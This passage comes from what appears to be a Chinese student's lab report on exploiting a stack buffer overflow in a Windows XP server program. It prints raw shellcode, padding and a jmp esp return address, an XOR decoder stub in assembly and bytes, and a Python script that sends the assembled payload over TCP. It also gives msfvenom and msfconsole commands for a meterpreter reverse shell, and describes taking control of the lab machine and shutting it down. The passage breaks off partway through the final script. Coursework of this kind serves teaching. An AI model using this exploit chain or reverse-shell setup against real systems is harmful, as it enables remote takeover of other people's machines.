<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未 encode 的计算器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noEncodeCalc</span>():</span></span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">b&#x27;\x55\x8B\xEC\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0\x8B\xE5\x5D\x33&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = offset + jmp_esp + shellcode</span><br><span class="line"></span><br><span class="line">    sendPayload(payload)</span><br></pre></td></tr></table></figure>
<p>运行之前先在xp中启动服务端程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119161231759.png" alt="图10 启动服务器"></p>
<p>运行之后即可在服务端看到弹出的计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119161306744.png" alt="图11 弹出计算器"></p>
<h2 id="3-5-shellcode-编码"><a href="#3-5-shellcode-编码" class="headerlink" title="3.5 shellcode 编码"></a>3.5 shellcode 编码</h2><p>由于上述的计算器shellcode代码中无 <code>\x00</code> 特殊字符，因此可以一瞬成功。但是并不能保证每中shellcode都能通用，因此对shellcode进行编码绕过特殊字符是非常有必要的。根据上课讲授的思想，可以通过某种异或的方式来对原来的shellcode进行异或编码。然后在服务端运行一个解码函数先对shellcode进行解码，然后再执行shellcode就可以避免被截断从而被攻击。</p>
<p>然后可以依照ppt上的指示，适当修改代码中需要解码的shellcode的长度和编码的key，然后编写汇编代码，放入VC6中进行编译，然后copy这个编译完毕的decode码，并将自己的shellcode进行编码即可拼接。</p>
<p>下面是解码函数的汇编代码，只需要修改对应的key和长度即可。在VC6中 <code>F10</code> 打开 debug 模式可以获取其机器码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		jmp decode_end </span><br><span class="line">		decode_start:</span><br><span class="line">		pop edx </span><br><span class="line">		dec edx</span><br><span class="line">		<span class="keyword">xor</span> ecx,ecx</span><br><span class="line">		mov cx,<span class="number">0x300</span> </span><br><span class="line">		decode_loop:</span><br><span class="line">		<span class="keyword">xor</span> byte ptr [edx+ecx], <span class="number">0x1</span> </span><br><span class="line">		loop decode_loop </span><br><span class="line">		jmp decode_ok </span><br><span class="line">		decode_end:</span><br><span class="line">		call decode_start</span><br><span class="line">		decode_ok: </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119161517110.png" alt="图12 decode汇编源码"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119161553524.png" alt="图13 汇编转机器码"></p>
<p><strong>小插曲</strong></p>
<p><del>如上图中通过调试和编译即可以获得准确的decode函数的机器码。然后进行拼接shellcode即可以完成。但是！！！上述的代码中有一个致命的错误！！！这份decode码是专门用于躲掉“\x00”的，但是它自己却整了个“\x00”？？？好叭别担心，我们从上述的汇编源码中可以很清楚看到这个“\x00”是来源于解码的长度，只需要修改一下长度即可。</del></p>
<p>好的，对于老师所说：“思考为什么是 <code>0x97</code> 而不是其他的”，我的结论是无所谓是否是 <code>0x97</code>，只需要shellcode中没有这个字符就可以了，key的枚举范围可以是 <code>0x01~0xff </code>这个范围，一个有效的shellcode能同时包含这些所有的字符的概率是非常小的。因此，随便枚举一个合适的key是可行的，并且是<strong>方便的</strong>。</p>
<p>但是非要追求完美，也可以自己实现一个完美的可以解决的思路，（<strong>此想法来源于室友</strong>）。即对所有的字符都选用key为 <code>0x77</code>，则只有当shellcode中出现的 <code>0x77</code> 会出现 <code>0x00</code> 截断。但是可以将原来的 <code>0x77</code> 转化为 <code>0xff 0x77</code>，而将原来的 <code>0x88</code> 转化为 <code>0xff 0x88</code>。而解码的时候，遇到上述转义的双字节即可解码为一个单字节。上述的编码即可以保证最极端的情况下也可以绕过 <code>0x00</code>。</p>
<p>限于我暂时没有学过汇编 <del>（问就是我太菜了）</del> ，只能勉强看懂前面的汇编代码，因此这里没有对这个想法进行实现。</p>
<h2 id="3-6-shellcode-编码的计算器弹出"><a href="#3-6-shellcode-编码的计算器弹出" class="headerlink" title="3.6 shellcode 编码的计算器弹出"></a>3.6 shellcode 编码的计算器弹出</h2><p> 有了上述的基础，只需要将shellcode放入编码函数中进行一个编码即可。有了上述的编码函数，我们点击就送一下。发现编码的shellcode还是可以成功弹出计算器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encode 的 计算器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeCalc</span>():</span></span><br><span class="line">    </span><br><span class="line">    s = <span class="string">b&#x27;\x55\x8B\xEC\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0\x8B\xE5\x5D\x33&#x27;</span></span><br><span class="line">    encodeShellcode(s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload 的前面字段</span></span><br><span class="line">offset = <span class="string">b&#x27;\x65\x4d\x6f\x6f\x7a\x65\x53\x67\x74\x6f\x31\x73\x68\x35\x6d\x4c\x6f\x76\x5a\x46\x58\x38\x43\x52\x66\x49\x79\x77\x33\x49\x4e\x4b\x37\x65\x54\x5a\x72\x45\x4e\x35\x63\x41\x64\x37\x42\x6d\x71\x30\x32\x74\x48\x7a\x44\x70\x32\x45\x75\x50\x6a\x56\x46\x6d\x45\x63\x58\x68\x7a\x4e\x55\x4d\x6c\x47\x44\x6a\x31\x32\x4d\x6a\x75\x74\x53\x79\x67\x44\x6e\x68\x39\x32\x7a\x50\x6f\x71\x54\x32\x31\x37\x36\x34\x36\x4a\x55\x57\x30\x4b\x69\x74\x30\x58\x75\x75\x59\x58\x64\x30\x57\x48\x4d\x6d\x30\x41\x66\x78\x75\x77\x31\x50\x6b\x35\x39\x4e\x74\x46\x4a\x6f\x37\x4b\x30\x55\x4e\x67\x6c\x62\x30\x5a\x6b\x74\x6a\x57\x56\x33\x56\x39\x53\x46\x79\x54\x32\x6e\x68\x49\x33\x75\x41\x59\x30\x5a\x6a\x67\x35\x51\x71\x47\x6b\x56\x5a\x38\x41\x6a\x41\x47\x53\x32\x63\x63\x39\x6f\x35\x61\x41\x58\x58\x31\x4f\x59\x49\x77\x48\x68\x30\x4c\x6b\x46\x73\x48\x6a\x74\x39\x61\x36\x37\x79\x63\x39\x4c\x4a\x44\x6d\x5a\x35\x5a\x6b\x45\x5a\x75\x70\x6e\x44\x6d\x65\x74\x78\x45\x36\x69\x74\x50\x47\x35\x4b\x36\x52\x46\x4c\x78\x44\x31\x68\x67\x4b\x55\x46\x32\x75\x5a\x68\x75\x55\x73\x38\x66\x68\x63\x4e\x49\x32\x63\x51\x57\x51\x79\x74\x54\x73\x65\x68\x4e\x78\x49\x43\x34\x43\x46\x67\x53\x57\x76\x6d\x49\x45\x77\x47\x66\x66\x34\x59\x4a\x30\x65\x67\x41\x34\x54\x64\x7a\x6e\x43\x6f\x4f\x42\x73\x34\x71\x6b\x55\x76\x7a\x56\x75\x6f\x4c\x4e\x41\x69\x45\x74\x64\x6e\x51\x64\x47\x62\x70\x52\x4c\x68\x6c\x51\x72\x34\x42\x4b\x79\x44\x64\x42\x6b\x49\x64\x48\x57\x47\x66\x4f\x6c\x47\x39\x72\x32\x70\x7a\x79\x56\x4b\x6c\x4f\x71\x63\x30\x34\x47\x41\x4d\x35\x47\x79\x48\x50\x6a\x54\x4c\x78\x55\x74\x58\x5a\x59\x4c\x64\x65\x74\x6b\x68\x62\x79\x78\x77\x6b\x59\x7a\x43\x31\x58\x58\x38\x32\x6e\x46\x52\x67\x65\x42\x33\x69\x57\x56\x57\x6f\x4f\x51\x38\x68\x30\x6b\x51\x4b\x34\x5a\x35\x38\x48\x76\x4b\x4f\x4b\x46\x58\x4d\x38\x53\x38\x53\x42\x46\x62\x63\x6a\x58\x6b\x63\x47\x7a\x49\x77\x76\x70\x78\x6c\x68\x69\x33\x63\x42\x30\x57\x6a\x79\x47\x69\x69\x53\x6f\x70\x46\x46\x63\x36\x75\x66\x61\x6d\x77\x66\x47\x79\x61\x65\x68\x4b\x6f\x77\x58\x53\x4a\x61\x39\x6c\x39\x78\x58\x41\x48\x4b\x50\x63&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jmp esp</span></span><br><span class="line">jmp_esp = <span class="string">b&#x27;\x7b\x46\x86\x7c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeShellcode</span>(<span class="params">shellcode, length = <span class="number">0x501</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一个参数是 需要编码的 shellcode 字节</span></span><br><span class="line"><span class="string">    第二个参数是其长度 </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回 key 和 编码后的 shellcode 字节</span></span><br><span class="line">    key, shellcode_encode = getKey(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过 key 和 长度来确定要发送的 decode 函数的字节</span></span><br><span class="line">    decode_code = getDecode(key, length)</span><br><span class="line">    </span><br><span class="line">    payload = offset + jmp_esp + decode_code + shellcode_encode</span><br><span class="line"></span><br><span class="line">    sendPayload(payload)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到将 shellcode 进行解码的函数的 code </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDecode</span>(<span class="params">key = <span class="number">0x97</span>, shellcodeLength = <span class="number">0x501</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    目前先整个 0x501 个字节，生成解码函数的字节码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不想整太麻烦了 就写至少 3 位吧</span></span><br><span class="line">    shellcodeLength = <span class="built_in">max</span>(<span class="number">0x501</span>, shellcodeLength)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> shellcodeLength &gt; <span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;payload 的长度太长了 (我还没研究太长会怎么样)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> key &lt;= <span class="number">0xff</span>, <span class="string">&quot;key 太长了 (这种简单的编码方法不适用于这个 payload)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lenNeedDecode = <span class="built_in">bytes</span>([shellcodeLength % <span class="number">256</span>]) + <span class="built_in">bytes</span>([shellcodeLength//<span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> lenNeedDecode[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">or</span> lenNeedDecode[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">r&quot;decode 函数中有 &#x27;\x00&#x27; 请检查长度&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码函数的编码后 code</span></span><br><span class="line">    decode_code = <span class="string">b&#x27;\xEB\x10\x5A\x4A\x33\xC9\x66\xB9&#x27;</span> + lenNeedDecode + <span class="string">b&#x27;\x80\x34\x0A&#x27;</span> + <span class="built_in">bytes</span>([key]) + <span class="string">b&#x27;\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decode_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    s shellcode 机器码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ans = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    key = <span class="number">0x01</span></span><br><span class="line">    <span class="keyword">while</span> key &lt;= <span class="number">0xff</span>:</span><br><span class="line">        temp = <span class="number">0x01</span></span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            temp = i ^ key</span><br><span class="line">            x.append(temp)</span><br><span class="line">            <span class="keyword">if</span> temp == <span class="number">0x00</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> temp == <span class="number">0x00</span>:</span><br><span class="line">            key += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">                ans += <span class="built_in">bytes</span>([i]) <span class="comment"># int to bytes</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> key, ans</span><br></pre></td></tr></table></figure>
<p>在服务端启动server程序后，运行上述的攻击代码，就可以实现弹出一个计算器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162355637.png" alt="图14 弹出计算器"></p>
<h2 id="3-7-反弹shell的编码使用"><a href="#3-7-反弹shell的编码使用" class="headerlink" title="3.7 反弹shell的编码使用"></a>3.7 反弹shell的编码使用</h2><p>反弹shell的编写在上述都成功的基础上，此问题即已经变得很简单了。只需要编写一个连接回来的客户端shellcode代码，然后将shellcode修改覆盖原来的shellcode即可完成反弹shell的实现。</p>
<p>这里本着不重复造轮子的原则我们可以使用msf提供的工具来生成这个反弹shell的程序。</p>
<p>使用命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.195.128 lport=8964 &gt; apu2.bin</span><br></pre></td></tr></table></figure>
<p>可以生成一个反弹shell的二进制文件，将其打开填入上述原来的shellcode的位置中即可完成。</p>
<p>本来 <code>msf</code> 可以自己设定编码绕过特殊字符的，但是我这波没有跑起来就放弃了，还是自己写了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162526809.png" alt="图15 生成反弹shell"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162540667.png" alt="图16 反弹马HEX"></p>
<p>于是在上述的程序中，修改了一下shellcode即可完成了这个点击就送。使用 <code>msf</code> 就可以在终端中进行监听了。使用命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.195.128</span><br><span class="line">set lport 8964</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162610759.png" alt="图17 kali监听"></p>
<p>然后在服务端运行server程序，运行攻击脚本，然后点击就送，运行python脚本就可以获得shell了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162648321.png" alt="图18 接收shell"></p>
<p>如上图所示，可以任意执行xp下面的命令，对xp进行控制。查看对方的IP，让对方关机等等，这个机器就完全被控制了。可以看到xp就被关机了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162739242.png" alt="图19 远程执行关机命令"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119162755859.png" alt="图20 xp关机"></p>
<p>通过上述的实验成功实现了远程反弹shell的编写利用。</p>
<h1 id="0x04-实验脚本"><a href="#0x04-实验脚本" class="headerlink" title="0x04 实验脚本"></a>0x04 实验脚本</h1><p><code>hack.py</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xor encode同ppt参考： https://www.guhei.net/post/jb635 </span></span><br><span class="line"><span class="comment"># msf 参考 https://www.cnblogs.com/clever-universe/p/8691365.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务器主机名和端口</span></span><br><span class="line"><span class="comment"># serverName = &#x27;10.132.15.137&#x27;</span></span><br><span class="line">serverName = <span class="string">&#x27;192.168.195.129&#x27;</span></span><br><span class="line">serverPort = <span class="number">50002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 shellcode</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户端创建基于TCP的socket</span></span><br><span class="line">    clientSocket = socket(AF_INET, SOCK_STREAM) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#客户端向服务器发送连接建立请求</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        clientSocket.connect((serverName,serverPort))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;fail to connect.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送payload</span></span><br><span class="line">    clientSocket.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 接收服务端的内容</span></span><br><span class="line">    <span class="comment"># modifiedSentence = clientSocket.recv(1024)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 打印接受的东西</span></span><br><span class="line">    <span class="comment"># print(modifiedSentence.decode())</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#客户端关闭TCP连接</span></span><br><span class="line">    clientSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload 的前面字段</span></span><br><span class="line">offset = <span class="string">b&#x27;\x65\x4d\x6f\x6f\x7a\x65\x53\x67\x74\x6f\x31\x73\x68\x35\x6d\x4c\x6f\x76\x5a\x46\x58\x38\x43\x52\x66\x49\x79\x77\x33\x49\x4e\x4b\x37\x65\x54\x5a\x72\x45\x4e\x35\x63\x41\x64\x37\x42\x6d\x71\x30\x32\x74\x48\x7a\x44\x70\x32\x45\x75\x50\x6a\x56\x46\x6d\x45\x63\x58\x68\x7a\x4e\x55\x4d\x6c\x47\x44\x6a\x31\x32\x4d\x6a\x75\x74\x53\x79\x67\x44\x6e\x68\x39\x32\x7a\x50\x6f\x71\x54\x32\x31\x37\x36\x34\x36\x4a\x55\x57\x30\x4b\x69\x74\x30\x58\x75\x75\x59\x58\x64\x30\x57\x48\x4d\x6d\x30\x41\x66\x78\x75\x77\x31\x50\x6b\x35\x39\x4e\x74\x46\x4a\x6f\x37\x4b\x30\x55\x4e\x67\x6c\x62\x30\x5a\x6b\x74\x6a\x57\x56\x33\x56\x39\x53\x46\x79\x54\x32\x6e\x68\x49\x33\x75\x41\x59\x30\x5a\x6a\x67\x35\x51\x71\x47\x6b\x56\x5a\x38\x41\x6a\x41\x47\x53\x32\x63\x63\x39\x6f\x35\x61\x41\x58\x58\x31\x4f\x59\x49\x77\x48\x68\x30\x4c\x6b\x46\x73\x48\x6a\x74\x39\x61\x36\x37\x79\x63\x39\x4c\x4a\x44\x6d\x5a\x35\x5a\x6b\x45\x5a\x75\x70\x6e\x44\x6d\x65\x74\x78\x45\x36\x69\x74\x50\x47\x35\x4b\x36\x52\x46\x4c\x78\x44\x31\x68\x67\x4b\x55\x46\x32\x75\x5a\x68\x75\x55\x73\x38\x66\x68\x63\x4e\x49\x32\x63\x51\x57\x51\x79\x74\x54\x73\x65\x68\x4e\x78\x49\x43\x34\x43\x46\x67\x53\x57\x76\x6d\x49\x45\x77\x47\x66\x66\x34\x59\x4a\x30\x65\x67\x41\x34\x54\x64\x7a\x6e\x43\x6f\x4f\x42\x73\x34\x71\x6b\x55\x76\x7a\x56\x75\x6f\x4c\x4e\x41\x69\x45\x74\x64\x6e\x51\x64\x47\x62\x70\x52\x4c\x68\x6c\x51\x72\x34\x42\x4b\x79\x44\x64\x42\x6b\x49\x64\x48\x57\x47\x66\x4f\x6c\x47\x39\x72\x32\x70\x7a\x79\x56\x4b\x6c\x4f\x71\x63\x30\x34\x47\x41\x4d\x35\x47\x79\x48\x50\x6a\x54\x4c\x78\x55\x74\x58\x5a\x59\x4c\x64\x65\x74\x6b\x68\x62\x79\x78\x77\x6b\x59\x7a\x43\x31\x58\x58\x38\x32\x6e\x46\x52\x67\x65\x42\x33\x69\x57\x56\x57\x6f\x4f\x51\x38\x68\x30\x6b\x51\x4b\x34\x5a\x35\x38\x48\x76\x4b\x4f\x4b\x46\x58\x4d\x38\x53\x38\x53\x42\x46\x62\x63\x6a\x58\x6b\x63\x47\x7a\x49\x77\x76\x70\x78\x6c\x68\x69\x33\x63\x42\x30\x57\x6a\x79\x47\x69\x69\x53\x6f\x70\x46\x46\x63\x36\x75\x66\x61\x6d\x77\x66\x47\x79\x61\x65\x68\x4b\x6f\x77\x58\x53\x4a\x61\x39\x6c\x39\x78\x58\x41\x48\x4b\x50\x63&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jmp esp</span></span><br><span class="line">jmp_esp = <span class="string">b&#x27;\x7b\x46\x86\x7c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeShellcode</span>(<span class="params">shellcode, length = <span class="number">0x501</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一个参数是 需要编码的 shellcode 字节</span></span><br><span class="line"><span class="string">    第二个参数是其长度 </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回 key 和 编码后的 shellcode 字节</span></span><br><span class="line">    key, shellcode_encode = getKey(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过 key 和 长度来确定要发送的 decode 函数的字节</span></span><br><span class="line">    decode_code = getDecode(key, length)</span><br><span class="line">    </span><br><span class="line">    payload = offset + jmp_esp + decode_code + shellcode_encode</span><br><span class="line"></span><br><span class="line">    sendPayload(payload)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到将 shellcode 进行解码的函数的 code </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDecode</span>(<span class="params">key = <span class="number">0x97</span>, shellcodeLength = <span class="number">0x501</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    目前先整个 0x501 个字节，生成解码函数的字节码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不想整太麻烦了 就写至少 3 位吧</span></span><br><span class="line">    shellcodeLength = <span class="built_in">max</span>(<span class="number">0x501</span>, shellcodeLength)</span><br><span class="line"></span><br><span class="line">   